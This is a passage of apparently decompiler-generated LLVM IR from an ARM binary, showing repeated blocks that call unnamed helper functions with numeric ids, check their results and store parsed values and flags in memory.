  %v4_9b14 = add i32 %v3_9b14, %v2_9b0c
  %v5_9b14 = inttoptr i32 %v4_9b14 to i8*
  store i8 0, i8* %v5_9b14, align 1
  %v0_9b18 = load i32, i32* @r5, align 4
  store i32 %v0_9b18, i32* %r1.global-to-local, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v2_9b20 = inttoptr i32 %v0_9b18 to i32*
  %v3_9b20 = call i32 @function_1219c(i32 53, i32* %v2_9b20)
  %v0_9b24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9b24, i32* @r1, align 4
  store i32 %v3_9b20, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_9b30 = call i32 @function_13088(i8* %tmp200, i32 %v0_9b24, i32 %v3_9b20)
  store i32 %v4_9b30, i32* %r0.global-to-local, align 4
  %v1_9b34 = add i32 %v4_9b30, 1
  %v2_9b34 = icmp eq i32 %v4_9b30, -1
  store i1 %v2_9b34, i1* %cpsr_c.global-to-local, align 1
  %v3_9b34 = sub i32 0, %v4_9b30
  %v4_9b34 = and i32 %v1_9b34, %v3_9b34
  %v5_9b34 = icmp slt i32 %v4_9b34, 0
  store i1 %v5_9b34, i1* %cpsr_v.global-to-local, align 1
  %v6_9b34 = icmp slt i32 %v1_9b34, 0
  store i1 %v6_9b34, i1* %cpsr_n.global-to-local, align 1
  %v7_9b34 = icmp eq i32 %v1_9b34, 0
  store i1 %v7_9b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b34, label %.thread46, label %bb217

bb217:                                            ; preds = %dec_label_pc_9af0
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_9b3c = load i32, i32* @r8, align 4
  %v3_9b3c = add i32 %v2_9b3c, -4
  %v4_9b3c = inttoptr i32 %v3_9b3c to i32*
  store i32 2, i32* %v4_9b3c, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_9af0, %bb217
  %v0_9b40 = load i32, i32* @r5, align 4
  store i32 %v0_9b40, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r0.global-to-local, align 4
  %v2_9b48 = inttoptr i32 %v0_9b40 to i32*
  %v3_9b48 = call i32 @function_1219c(i32 52, i32* %v2_9b48)
  %v0_9b4c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9b4c, i32* @r1, align 4
  store i32 %v3_9b48, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_9b58 = call i32 @function_13088(i8* %tmp200, i32 %v0_9b4c, i32 %v3_9b48)
  store i32 %v4_9b58, i32* %r0.global-to-local, align 4
  %v1_9b5c = add i32 %v4_9b58, 1
  %v2_9b5c = icmp eq i32 %v4_9b58, -1
  store i1 %v2_9b5c, i1* %cpsr_c.global-to-local, align 1
  %v3_9b5c = sub i32 0, %v4_9b58
  %v4_9b5c = and i32 %v1_9b5c, %v3_9b5c
  %v5_9b5c = icmp slt i32 %v4_9b5c, 0
  store i1 %v5_9b5c, i1* %cpsr_v.global-to-local, align 1
  %v6_9b5c = icmp slt i32 %v1_9b5c, 0
  store i1 %v6_9b5c, i1* %cpsr_n.global-to-local, align 1
  %v7_9b5c = icmp eq i32 %v1_9b5c, 0
  store i1 %v7_9b5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b5c, label %.thread47, label %bb218

bb218:                                            ; preds = %.thread46
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9b64 = load i32, i32* @r8, align 4
  %v3_9b64 = add i32 %v2_9b64, -4
  %v4_9b64 = inttoptr i32 %v3_9b64 to i32*
  store i32 1, i32* %v4_9b64, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb218
  %v0_9b68 = load i32, i32* @r5, align 4
  store i32 %v0_9b68, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9b70 = load i32, i32* @r8, align 4
  %v2_9b70 = inttoptr i32 %v1_9b70 to i32*
  store i32 %v0_9b68, i32* %v2_9b70, align 4
  %v2_9b74 = inttoptr i32 %v0_9b68 to i32*
  %v3_9b74 = call i32 @function_1219c(i32 51, i32* %v2_9b74)
  %v0_9b78 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9b78, i32* @r1, align 4
  store i32 %v3_9b74, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_9b84 = call i32 @function_13088(i8* %tmp200, i32 %v0_9b78, i32 %v3_9b74)
  store i32 %v4_9b84, i32* %r0.global-to-local, align 4
  %v1_9b88 = add i32 %v4_9b84, 1
  %v2_9b88 = icmp eq i32 %v4_9b84, -1
  store i1 %v2_9b88, i1* %cpsr_c.global-to-local, align 1
  %v3_9b88 = sub i32 0, %v4_9b84
  %v4_9b88 = and i32 %v1_9b88, %v3_9b88
  %v5_9b88 = icmp slt i32 %v4_9b88, 0
  store i1 %v5_9b88, i1* %cpsr_v.global-to-local, align 1
  %v6_9b88 = icmp slt i32 %v1_9b88, 0
  store i1 %v6_9b88, i1* %cpsr_n.global-to-local, align 1
  %v7_9b88 = icmp eq i32 %v1_9b88, 0
  store i1 %v7_9b88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9b88, label %.thread48, label %dec_label_pc_9b90

dec_label_pc_9b90:                                ; preds = %.thread47
  %v0_9b90 = load i32, i32* @r5, align 4
  store i32 %v0_9b90, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v2_9b98 = inttoptr i32 %v0_9b90 to i32*
  %v3_9b98 = call i32 @function_1219c(i32 51, i32* %v2_9b98)
  %v0_9b9c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9b9c, i32* @r1, align 4
  store i32 %v3_9b98, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_9ba8 = call i32 @function_13088(i8* %tmp200, i32 %v0_9b9c, i32 %v3_9b98)
  store i32 %v4_9ba8, i32* %r0.global-to-local, align 4
  store i32 %v2_9418, i32* %lr.global-to-local, align 4
  %v2_9bb4 = add i32 %v4_9ba8, %v2_9418
  store i32 %v2_9bb4, i32* %r3.global-to-local, align 4
  %v1_9bb8 = load i32, i32* @r6, align 4
  %v2_9bb8 = add i32 %v1_9bb8, %v2_9bb4
  %v3_9bb8 = inttoptr i32 %v2_9bb8 to i8*
  %v4_9bb8 = load i8, i8* %v3_9bb8, align 1
  %v2_9bc0 = icmp ugt i8 %v4_9bb8, 31
  store i1 %v2_9bc0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9bc0 = icmp ult i8 %v4_9bb8, 32
  store i1 %v6_9bc0, i1* %cpsr_n.global-to-local, align 1
  %v7_9bc0 = icmp eq i8 %v4_9bb8, 32
  store i1 %v7_9bc0, i1* %cpsr_z.global-to-local, align 1
  %v2_9bc8 = zext i1 %v7_9bc0 to i32
  %v2_9bc8.v4_9ba8 = add i32 %v2_9bc8, %v4_9ba8
  store i32 %v2_9bc8.v4_9ba8, i32* @r4, align 4
  %v2_9bcc = add i32 %v2_9bc8.v4_9ba8, %v2_8f50
  store i32 %v2_9bcc, i32* @r6, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9bcc, i32* %r0.global-to-local, align 4
  %v1_9bd8 = load i32, i32* %fp.global-to-local, align 4
  %v2_9bd8 = sub i32 %v1_9bd8, %v2_9bc8.v4_9ba8
  store i32 %v2_9bd8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_9be0 = call i32 @function_12df8(i32 %v2_9bcc, i32 %v2_9bd8, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32 2)
  store i32 %v4_9be0, i32* %r0.global-to-local, align 4
  %v1_9be4 = add i32 %v4_9be0, 1
  %v2_9be4 = icmp eq i32 %v4_9be0, -1
  store i1 %v2_9be4, i1* %cpsr_c.global-to-local, align 1
  %v3_9be4 = sub i32 0, %v4_9be0
  %v4_9be4 = and i32 %v1_9be4, %v3_9be4
  %v5_9be4 = icmp slt i32 %v4_9be4, 0
  store i1 %v5_9be4, i1* %cpsr_v.global-to-local, align 1
  %v6_9be4 = icmp slt i32 %v1_9be4, 0
  store i1 %v6_9be4, i1* %cpsr_n.global-to-local, align 1
  %v7_9be4 = icmp eq i32 %v1_9be4, 0
  store i1 %v7_9be4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9be0, i32* %r2.global-to-local, align 4
  br i1 %v7_9be4, label %.thread48, label %dec_label_pc_9bf0

dec_label_pc_9bf0:                                ; preds = %dec_label_pc_9b90
  store i32 %v2_9418, i32* %ip.global-to-local, align 4
  %v1_9bf8 = load i32, i32* @r4, align 4
  %v2_9bf8 = add i32 %v1_9bf8, %v2_9418
  %v1_9bfc = add i32 %v4_9be0, -1
  %v2_9bfc = icmp ne i32 %v4_9be0, 0
  store i1 %v2_9bfc, i1* %cpsr_c.global-to-local, align 1
  %v3_9bfc = sub i32 0, %v4_9be0
  %v4_9bfc = and i32 %v4_9be0, %v3_9bfc
  %v5_9bfc = icmp slt i32 %v4_9bfc, 0
  store i1 %v5_9bfc, i1* %cpsr_v.global-to-local, align 1
  %v6_9bfc = icmp slt i32 %v1_9bfc, 0
  store i1 %v6_9bfc, i1* %cpsr_n.global-to-local, align 1
  %v7_9bfc = icmp eq i32 %v4_9be0, 1
  store i1 %v7_9bfc, i1* %cpsr_z.global-to-local, align 1
  %v1_9c00 = add i32 %v2_9bf8, -20736
  store i32 %v1_9c00, i32* %r3.global-to-local, align 4
  %v7_9c04 = icmp sgt i32 %v4_9be0, 1
  br i1 %v7_9c04, label %bb219, label %bb220

bb219:                                            ; preds = %dec_label_pc_9bf0
  %v9_9c04 = add i32 %v4_9be0, -2
  store i32 %v9_9c04, i32* %r2.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_9bf0, %bb219
  %v3_9c0c = phi i32 [ %v4_9be0, %dec_label_pc_9bf0 ], [ %v9_9c04, %bb219 ]
  %v1_9c08 = add i32 %v2_9bf8, -20773
  store i32 %v1_9c08, i32* %r3.global-to-local, align 4
  %v0_9c0c = load i32, i32* @r5, align 4
  %v1_9c0c = trunc i32 %v0_9c0c to i8
  %v4_9c0c = add i32 %v3_9c0c, %v1_9c08
  %v5_9c0c = inttoptr i32 %v4_9c0c to i8*
  store i8 %v1_9c0c, i8* %v5_9c0c, align 1
  %v0_9c10 = load i32, i32* @r6, align 4
  store i32 %v0_9c10, i32* %r0.global-to-local, align 4
  %v1_9c14 = inttoptr i32 %v0_9c10 to i8*
  %v2_9c14 = call i32 @function_12d34(i8* %v1_9c14)
  %v0_9c18 = load i32, i32* @r5, align 4
  store i32 %v0_9c18, i32* %r1.global-to-local, align 4
  store i32 %v2_9c14, i32* @r4, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v2_9c24 = inttoptr i32 %v0_9c18 to i32*
  %v3_9c24 = call i32 @function_1219c(i32 50, i32* %v2_9c24)
  %v0_9c28 = load i32, i32* @r4, align 4
  store i32 %v0_9c28, i32* @r1, align 4
  store i32 %v3_9c24, i32* %r2.global-to-local, align 4
  %v0_9c30 = load i32, i32* @r6, align 4
  store i32 %v0_9c30, i32* %r0.global-to-local, align 4
  %v3_9c34 = inttoptr i32 %v0_9c30 to i8*
  %v4_9c34 = call i32 @function_13088(i8* %v3_9c34, i32 %v0_9c28, i32 %v3_9c24)
  store i32 %v4_9c34, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9c38 = icmp slt i32 %v4_9c34, 0
  store i1 %v1_9c38, i1* %cpsr_n.global-to-local, align 1
  %v2_9c38 = icmp eq i32 %v4_9c34, 0
  store i1 %v2_9c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9c38, label %.thread48, label %bb221

bb221:                                            ; preds = %bb220
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9c40 = load i32, i32* @r8, align 4
  %v3_9c40 = inttoptr i32 %v2_9c40 to i32*
  store i32 1, i32* %v3_9c40, align 4
  br label %.thread48

.thread48:                                        ; preds = %bb220, %dec_label_pc_9b90, %.thread47, %bb221
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_9c50 = load i32, i32* @r8, align 4
  %v2_9c50 = add i32 %v1_9c50, 4
  %v3_9c50 = inttoptr i32 %v2_9c50 to i32*
  store i32 0, i32* %v3_9c50, align 4
  %v3_9c54 = call i32 @function_1219c(i32 48, i32* null)
  %v0_9c58 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c58, i32* @r1, align 4
  store i32 %v3_9c54, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_9c64 = call i32 @function_13088(i8* %tmp200, i32 %v0_9c58, i32 %v3_9c54)
  store i32 %v4_9c64, i32* %r0.global-to-local, align 4
  %v1_9c6c = add i32 %v4_9c64, 1
  %v2_9c6c = icmp eq i32 %v4_9c64, -1
  store i1 %v2_9c6c, i1* %cpsr_c.global-to-local, align 1
  %v3_9c6c = sub i32 0, %v4_9c64
  %v4_9c6c = and i32 %v1_9c6c, %v3_9c6c
  %v5_9c6c = icmp slt i32 %v4_9c6c, 0
  store i1 %v5_9c6c, i1* %cpsr_v.global-to-local, align 1
  %v6_9c6c = icmp slt i32 %v1_9c6c, 0
  store i1 %v6_9c6c, i1* %cpsr_n.global-to-local, align 1
  %v7_9c6c = icmp eq i32 %v1_9c6c, 0
  store i1 %v7_9c6c, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_9c6c, label %.thread49, label %dec_label_pc_9c78

dec_label_pc_9c78:                                ; preds = %.thread48
  %v0_9c78 = load i32, i32* @r6, align 4
  store i32 %v0_9c78, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_9c80 = inttoptr i32 %v0_9c78 to i32*
  %v3_9c80 = call i32 @function_1219c(i32 48, i32* %v2_9c80)
  %v0_9c84 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9c84, i32* @r1, align 4
  store i32 %v3_9c80, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_9c90 = call i32 @function_13088(i8* %tmp200, i32 %v0_9c84, i32 %v3_9c80)
  store i32 %v4_9c90, i32* %r0.global-to-local, align 4
  store i32 %v2_9418, i32* %lr.global-to-local, align 4
  %v2_9c9c = add i32 %v4_9c90, %v2_9418
  store i32 %v2_9c9c, i32* %r3.global-to-local, align 4
  %v1_9ca0 = load i32, i32* @r5, align 4
  %v2_9ca0 = add i32 %v1_9ca0, %v2_9c9c
  %v3_9ca0 = inttoptr i32 %v2_9ca0 to i8*
  %v4_9ca0 = load i8, i8* %v3_9ca0, align 1
  %v2_9ca8 = icmp ugt i8 %v4_9ca0, 31
  store i1 %v2_9ca8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9ca8 = icmp ult i8 %v4_9ca0, 32
  store i1 %v6_9ca8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ca8 = icmp eq i8 %v4_9ca0, 32
  store i1 %v7_9ca8, i1* %cpsr_z.global-to-local, align 1
  %v2_9cb0 = zext i1 %v7_9ca8 to i32
  %v2_9cb0.v4_9c90 = add i32 %v2_9cb0, %v4_9c90
  store i32 %v2_9cb0.v4_9c90, i32* @r4, align 4
  %v2_9cb4 = add i32 %v2_9cb0.v4_9c90, %v2_8f50
  store i32 %v2_9cb4, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9cb4, i32* %r0.global-to-local, align 4
  %v1_9cc0 = load i32, i32* %fp.global-to-local, align 4
  %v2_9cc0 = sub i32 %v1_9cc0, %v2_9cb0.v4_9c90
  store i32 %v2_9cc0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_9cc8 = call i32 @function_12df8(i32 %v2_9cb4, i32 %v2_9cc0, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32 2)
  store i32 %v4_9cc8, i32* %r0.global-to-local, align 4
  %v1_9ccc = add i32 %v4_9cc8, 1
  %v2_9ccc = icmp eq i32 %v4_9cc8, -1
  store i1 %v2_9ccc, i1* %cpsr_c.global-to-local, align 1
  %v3_9ccc = sub i32 0, %v4_9cc8
  %v4_9ccc = and i32 %v1_9ccc, %v3_9ccc
  %v5_9ccc = icmp slt i32 %v4_9ccc, 0
  store i1 %v5_9ccc, i1* %cpsr_v.global-to-local, align 1
  %v6_9ccc = icmp slt i32 %v1_9ccc, 0
  store i1 %v6_9ccc, i1* %cpsr_n.global-to-local, align 1
  %v7_9ccc = icmp eq i32 %v1_9ccc, 0
  store i1 %v7_9ccc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9cc8, i32* %r2.global-to-local, align 4
  br i1 %v7_9ccc, label %.thread49, label %dec_label_pc_9cd8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9c78
  store i32 %v2_9418, i32* %ip.global-to-local, align 4
  %v1_9ce0 = load i32, i32* @r4, align 4
  %v2_9ce0 = add i32 %v1_9ce0, %v2_9418
  %v1_9ce4 = add i32 %v4_9cc8, -1
  %v2_9ce4 = icmp ne i32 %v4_9cc8, 0
  store i1 %v2_9ce4, i1* %cpsr_c.global-to-local, align 1
  %v3_9ce4 = sub i32 0, %v4_9cc8
  %v4_9ce4 = and i32 %v4_9cc8, %v3_9ce4
  %v5_9ce4 = icmp slt i32 %v4_9ce4, 0
  store i1 %v5_9ce4, i1* %cpsr_v.global-to-local, align 1
  %v6_9ce4 = icmp slt i32 %v1_9ce4, 0
  store i1 %v6_9ce4, i1* %cpsr_n.global-to-local, align 1
  %v7_9ce4 = icmp eq i32 %v4_9cc8, 1
  store i1 %v7_9ce4, i1* %cpsr_z.global-to-local, align 1
  %v1_9ce8 = add i32 %v2_9ce0, -20736
  store i32 %v1_9ce8, i32* %r3.global-to-local, align 4
  %v7_9cec = icmp sgt i32 %v4_9cc8, 1
  br i1 %v7_9cec, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_9cd8
  %v9_9cec = add i32 %v4_9cc8, -2
  store i32 %v9_9cec, i32* %r2.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_9cd8, %bb222
  %v3_9cf4 = phi i32 [ %v4_9cc8, %dec_label_pc_9cd8 ], [ %v9_9cec, %bb222 ]
  %v1_9cf0 = add i32 %v2_9ce0, -20773
  store i32 %v1_9cf0, i32* %r3.global-to-local, align 4
  %v0_9cf4 = load i32, i32* @r6, align 4
  %v1_9cf4 = trunc i32 %v0_9cf4 to i8
  %v4_9cf4 = add i32 %v3_9cf4, %v1_9cf0
  %v5_9cf4 = inttoptr i32 %v4_9cf4 to i8*
  store i8 %v1_9cf4, i8* %v5_9cf4, align 1
  %v0_9cf8 = load i32, i32* @r5, align 4
  store i32 %v0_9cf8, i32* %r0.global-to-local, align 4
  %v1_9cfc = inttoptr i32 %v0_9cf8 to i8*
  %v2_9cfc = call i32 @function_12d34(i8* %v1_9cfc)
  %v0_9d00 = load i32, i32* @r6, align 4
  store i32 %v0_9d00, i32* %r1.global-to-local, align 4
  store i32 %v2_9cfc, i32* @r4, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v2_9d0c = inttoptr i32 %v0_9d00 to i32*
  %v3_9d0c = call i32 @function_1219c(i32 49, i32* %v2_9d0c)
  %v0_9d10 = load i32, i32* @r4, align 4
  store i32 %v0_9d10, i32* @r1, align 4
  store i32 %v3_9d0c, i32* %r2.global-to-local, align 4
  %v0_9d18 = load i32, i32* @r5, align 4
  store i32 %v0_9d18, i32* %r0.global-to-local, align 4
  %v3_9d1c = inttoptr i32 %v0_9d18 to i8*
  %v4_9d1c = call i32 @function_13088(i8* %v3_9d1c, i32 %v0_9d10, i32 %v3_9d0c)
  store i32 %v4_9d1c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9d20 = icmp slt i32 %v4_9d1c, 0
  store i1 %v1_9d20, i1* %cpsr_n.global-to-local, align 1
  %v2_9d20 = icmp eq i32 %v4_9d1c, 0
  store i1 %v2_9d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9d20, label %.thread49, label %bb224

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9d28 = load i32, i32* @r8, align 4
  %v3_9d28 = add i32 %v2_9d28, 4
  %v4_9d28 = inttoptr i32 %v3_9d28 to i32*
  store i32 1, i32* %v4_9d28, align 4
  br label %.thread49

.thread49:                                        ; preds = %bb223, %dec_label_pc_9c78, %.thread48, %bb224
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_9d34 = call i32 @function_1219c(i32 47, i32* null)
  %v0_9d38 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9d38, i32* @r1, align 4
  store i32 %v3_9d34, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_9d44 = call i32 @function_13088(i8* %tmp200, i32 %v0_9d38, i32 %v3_9d34)
  store i32 %v4_9d44, i32* %r0.global-to-local, align 4
  %v1_9d48 = add i32 %v4_9d44, 1
  %v2_9d48 = icmp eq i32 %v4_9d44, -1
  store i1 %v2_9d48, i1* %cpsr_c.global-to-local, align 1
  %v3_9d48 = sub i32 0, %v4_9d44
  %v4_9d48 = and i32 %v1_9d48, %v3_9d48
  %v5_9d48 = icmp slt i32 %v4_9d48, 0
  store i1 %v5_9d48, i1* %cpsr_v.global-to-local, align 1
  %v6_9d48 = icmp slt i32 %v1_9d48, 0
  store i1 %v6_9d48, i1* %cpsr_n.global-to-local, align 1
  %v7_9d48 = icmp eq i32 %v1_9d48, 0
  store i1 %v7_9d48, i1* %cpsr_z.global-to-local, align 1
  store i32 -20737, i32* %r5.global-to-local, align 4
  br i1 %v7_9d48, label %.thread, label %dec_label_pc_9d60

.thread:                                          ; preds = %.thread49
  store i32 -20773, i32* %r5.global-to-local, align 4
  %v2_9d58 = load i32, i32* @r8, align 4
  %v3_9d58 = add i32 %v2_9d58, 8
  %v4_9d58 = inttoptr i32 %v3_9d58 to i32*
  store i32 0, i32* %v4_9d58, align 4
  br label %dec_label_pc_9df4

dec_label_pc_9d60:                                ; preds = %.thread49
  store i32 -20773, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_9d68 = call i32 @function_1219c(i32 47, i32* null)
  %v0_9d6c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9d6c, i32* @r1, align 4
  store i32 %v3_9d68, i32* %r2.global-to-local, align 4
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  %v4_9d78 = call i32 @function_13088(i8* %tmp200, i32 %v0_9d6c, i32 %v3_9d68)
  store i32 %v4_9d78, i32* %r0.global-to-local, align 4
  store i32 %v2_9418, i32* %lr.global-to-local, align 4
  %v2_9d84 = add i32 %v4_9d78, %v2_9418
  store i32 %v2_9d84, i32* %r3.global-to-local, align 4
  %v1_9d88 = load i32, i32* @r5, align 4
  %v2_9d88 = add i32 %v1_9d88, %v2_9d84
  %v3_9d88 = inttoptr i32 %v2_9d88 to i8*
  %v4_9d88 = load i8, i8* %v3_9d88, align 1
  %v2_9d90 = icmp ugt i8 %v4_9d88, 31
  store i1 %v2_9d90, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9d90 = icmp ult i8 %v4_9d88, 32
  store i1 %v6_9d90, i1* %cpsr_n.global-to-local, align 1
  %v7_9d90 = icmp eq i8 %v4_9d88, 32
  store i1 %v7_9d90, i1* %cpsr_z.global-to-local, align 1
  %v2_9d98 = zext i1 %v7_9d90 to i32
  %v2_9d98.v4_9d78 = add i32 %v2_9d98, %v4_9d78
  store i32 %v2_9d98.v4_9d78, i32* @r4, align 4
  %v2_9d9c = add i32 %v2_9d98.v4_9d78, %v2_8f50
  store i32 %v2_9d9c, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9d9c, i32* %r0.global-to-local, align 4
  %v1_9da8 = load i32, i32* %fp.global-to-local, align 4
  %v2_9da8 = sub i32 %v1_9da8, %v2_9d98.v4_9d78
  store i32 %v2_9da8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_9db0 = call i32 @function_12df8(i32 %v2_9d9c, i32 %v2_9da8, i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32 2)
  store i32 %v4_9db0, i32* %r0.global-to-local, align 4
  %v1_9db4 = add i32 %v4_9db0, 1
  %v2_9db4 = icmp eq i32 %v4_9db0, -1
  store i1 %v2_9db4, i1* %cpsr_c.global-to-local, align 1
  %v3_9db4 = sub i32 0, %v4_9db0
  %v4_9db4 = and i32 %v1_9db4, %v3_9db4
  %v5_9db4 = icmp slt i32 %v4_9db4, 0
  store i1 %v5_9db4, i1* %cpsr_v.global-to-local, align 1
  %v6_9db4 = icmp slt i32 %v1_9db4, 0
  store i1 %v6_9db4, i1* %cpsr_n.global-to-local, align 1
  %v7_9db4 = icmp eq i32 %v1_9db4, 0
  store i1 %v7_9db4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_9db0, i32* %r2.global-to-local, align 4
  br i1 %v7_9db4, label %dec_label_pc_9df4, label %dec_label_pc_9dc0

dec_label_pc_9dc0:                                ; preds = %dec_label_pc_9d60
  store i32 %v2_9418, i32* %ip.global-to-local, align 4
  %v1_9dc8 = load i32, i32* @r4, align 4
  %v2_9dc8 = add i32 %v1_9dc8, %v2_9418
  %v1_9dcc = add i32 %v4_9db0, -1
  %v2_9dcc = icmp ne i32 %v4_9db0, 0
  store i1 %v2_9dcc, i1* %cpsr_c.global-to-local, align 1
  %v3_9dcc = sub i32 0, %v4_9db0
  %v4_9dcc = and i32 %v4_9db0, %v3_9dcc
  %v5_9dcc = icmp slt i32 %v4_9dcc, 0
  store i1 %v5_9dcc, i1* %cpsr_v.global-to-local, align 1
  %v6_9dcc = icmp slt i32 %v1_9dcc, 0
  store i1 %v6_9dcc, i1* %cpsr_n.global-to-local, align 1
  %v7_9dcc = icmp eq i32 %v4_9db0, 1
  store i1 %v7_9dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_9dd0 = add i32 %v2_9dc8, -20736
  store i32 %v1_9dd0, i32* %r3.global-to-local, align 4
  %v7_9dd4 = icmp sgt i32 %v4_9db0, 1
  br i1 %v7_9dd4, label %bb225, label %bb226

bb225:                                            ; preds = %dec_label_pc_9dc0
  %v9_9dd4 = add i32 %v4_9db0, -2
  store i32 %v9_9dd4, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_9dc0, %bb225
  %v3_9de8 = phi i32 [ %v4_9db0, %dec_label_pc_9dc0 ], [ %v9_9dd4, %bb225 ]
  %v1_9dd8 = add i32 %v2_9dc8, -20773
  store i32 %v1_9dd8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_9de0 = load i32, i32* @r5, align 4
  store i32 %v0_9de0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_9de8 = add i32 %v3_9de8, %v1_9dd8
  %v5_9de8 = inttoptr i32 %v4_9de8 to i8*
  store i8 0, i8* %v5_9de8, align 1
  %v2_9dec = inttoptr i32 %v0_9de0 to i8*
  %v3_9dec = call i32 @function_12e60(i8* %v2_9dec, i32 10)
  store i32 %v3_9dec, i32* %r0.global-to-local, align 4
  %v1_9df0 = load i32, i32* @r8, align 4
  %v2_9df0 = add i32 %v1_9df0, 8
  %v3_9df0 = inttoptr i32 %v2_9df0 to i32*
  store i32 %v3_9dec, i32* %v3_9df0, align 4
  br label %dec_label_pc_9df4

dec_label_pc_9df4:                                ; preds = %.thread, %dec_label_pc_9d60, %bb226
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9df8

dec_label_pc_9df8:                                ; preds = %dec_label_pc_9fcc, %dec_label_pc_9f4c, %dec_label_pc_9df4
  %v1_9e04 = phi i32 [ 0, %dec_label_pc_9df4 ], [ %v0_9f4c, %dec_label_pc_9f4c ], [ %v1_9e04.pre.pre, %dec_label_pc_9fcc ]
  store i32 %v2_8f50, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_9e04 = add i32 %v1_9e04, %v2_8f50
  store i32 %v2_9e04, i32* @r4, align 4
  %v3_9e08 = call i32 @function_1219c(i32 46, i32* null)
  %v0_9e0c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9e0c, i32* @r1, align 4
  store i32 %v3_9e08, i32* %r2.global-to-local, align 4
  %v0_9e14 = load i32, i32* @r4, align 4
  store i32 %v0_9e14, i32* %r0.global-to-local, align 4
  %v3_9e18 = inttoptr i32 %v0_9e14 to i8*
  %v4_9e18 = call i32 @function_13088(i8* %v3_9e18, i32 %v0_9e0c, i32 %v3_9e08)
